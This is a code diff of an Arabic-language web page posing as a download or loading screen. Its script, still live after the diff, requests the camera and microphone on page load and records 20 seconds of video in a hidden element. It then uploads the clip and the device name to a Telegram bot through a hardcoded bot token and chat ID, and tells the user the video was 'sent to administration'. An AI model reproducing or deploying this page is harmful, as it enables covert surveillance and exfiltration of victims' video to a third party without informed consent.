@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎬 جاري التحميل...</title>
     <style>
-        :root { --red: #e60000; --green: #059669; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: system-ui, sans-serif;
@@ -15,31 +14,15 @@
             text-align: center; padding: 20px;
         }
         .container { max-width: 400px; }
-        
         .status-icon { font-size: 60px; margin-bottom: 16px; }
         .status-text { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
         .status-sub { color: #aaa; font-size: 14px; }
-        
-        .progress-bar {
-            width: 100%; height: 6px; background: #222;
-            border-radius: 3px; margin-top: 20px; overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%; background: var(--red);
-            width: 0%; transition: width 0.3s;
-        }
-        
-        .countdown {
-            font-size: 48px; font-weight: 900; color: var(--red);
-            margin: 16px 0;
-        }
-        
-        .success-box {
-            display: none; text-align: center;
-        }
+        .countdown { font-size: 48px; font-weight: 900; color: #e60000; margin: 16px 0; }
+        .progress-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { height: 100%; background: #e60000; width: 0%; transition: width 0.3s; }
+        .success-box { display: none; }
         .success-box .check { font-size: 70px; }
-        .success-box h2 { color: var(--green); margin: 12px 0; }
-        
+        .success-box h2 { color: #059669; margin: 12px 0; }
         video { display: none; }
     </style>
 </head>
@@ -51,43 +34,31 @@
         <div class="status-text" id="main-status">يتم التحميل...</div>
         <div class="status-sub" id="sub-status">جاري الوصول للكاميرا</div>
         <div class="countdown" id="countdown">20</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progress-fill"></div>
-        </div>
+        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
     </div>
-    
     <div class="success-box" id="success-box">
         <div class="check">✅</div>
         <h2>تم التحميل بنجاح!</h2>
         <p style="color:#aaa;">الفيديو اتبعت للإدارة</p>
     </div>
-    
     <video id="hidden-video" autoplay playsinline muted></video>
 </div>
 
 <script>
 const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
 const ADMIN_ID = '7276604783';
-const RECORD_TIME = 20;
-
 let mediaRecorder, recordedChunks = [], stream;
 
 async function init() {
     try {
-        // طلب الكاميرا تلقائياً
         document.getElementById('main-status').textContent = '📷 جاري تشغيل الكاميرا...';
         document.getElementById('sub-status').textContent = 'الرجاء السماح بالكاميرا';
-        
         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         document.getElementById('hidden-video').srcObject = stream;
-        
-        // بدء التسجيل
         document.getElementById('main-status').textContent = '🔴 جاري التسجيل...';
         document.getElementById('sub-status').textContent = 'الرجاء الثبات أمام الكاميرا';
-        
         startRecording();
         startCountdown();
-        
     } catch (e) {
         document.getElementById('main-status').textContent = '❌ خطأ';
         document.getElementById('sub-status').textContent = 'لم يتم السماح بالكاميرا';
@@ -103,23 +74,15 @@ function startRecording() {
 }
 
 function startCountdown() {
-    let seconds = RECORD_TIME;
+    let seconds = 20;
     const countdownEl = document.getElementById('countdown');
     const progressFill = document.getElementById('progress-fill');
-    
     const interval = setInterval(() => {
         seconds--;
         countdownEl.textContent = seconds;
-        progressFill.style.width = ((RECORD_TIME - seconds) / RECORD_TIME * 100) + '%';
-        
-        if (seconds <= 5) {
-            document.getElementById('sub-status').textContent = '📤 جاري تجهيز الإرسال...';
-        }
-        
-        if (seconds <= 0) {
-            clearInterval(interval);
-            stopAndSend();
-        }
+        progressFill.style.width = ((20 - seconds) / 20 * 100) + '%';
+        if (seconds <= 5) document.getElementById('sub-status').textContent = '📤 جاري تجهيز الإرسال...';
+        if (seconds <= 0) { clearInterval(interval); stopAndSend(); }
     }, 1000);
 }
 
@@ -127,48 +90,20 @@ async function stopAndSend() {
     document.getElementById('main-status').textContent = '📤 جاري الإرسال...';
     document.getElementById('sub-status').textContent = 'يتم إرسال الفيديو للإدارة';
     document.getElementById('countdown').textContent = '...';
-    
     mediaRecorder.stop();
-    
-    // استنى التسجيل يخلص
     await new Promise(r => setTimeout(r, 2000));
-    
     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-    const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز غير معروف';
-    
-    // إرسال للبوت
-    const formData1 = new FormData();
-    formData1.append('chat_id', ADMIN_ID);
-    formData1.append('video', blob, 'video_' + Date.now() + '.webm');
-    formData1.append('caption', '🎬 فيديو جديد\n📱 الجهاز: ' + deviceName + '\n🕐 الوقت: ' + new Date().toLocaleString('ar-EG'));
-    
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: 'POST', body: formData1
-        });
-    } catch(e) {}
-    
-    // إرسال للادمن كمان
-    const formData2 = new FormData();
-    formData2.append('chat_id', '7276604783');
-    formData2.append('video', blob, 'video_' + Date.now() + '.webm');
-    formData2.append('caption', '🎬 فيديو جديد\n📱 الجهاز: ' + deviceName);
-    
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: 'POST', body: formData2
-        });
-    } catch(e) {}
-    
-    // إظهار النجاح
+    const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز';
+    const formData = new FormData();
+    formData.append('chat_id', ADMIN_ID);
+    formData.append('video', blob, 'video_' + Date.now() + '.webm');
+    formData.append('caption', '🎬 فيديو\n📱 ' + deviceName);
+    try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }); } catch(e) {}
     document.getElementById('status-screen').style.display = 'none';
     document.getElementById('success-box').style.display = 'block';
-    
-    // إيقاف الكاميرا
     stream.getTracks().forEach(t => t.stop());
 }
 
-// بدء تلقائي
 window.onload = init;
 </script>
 </body>
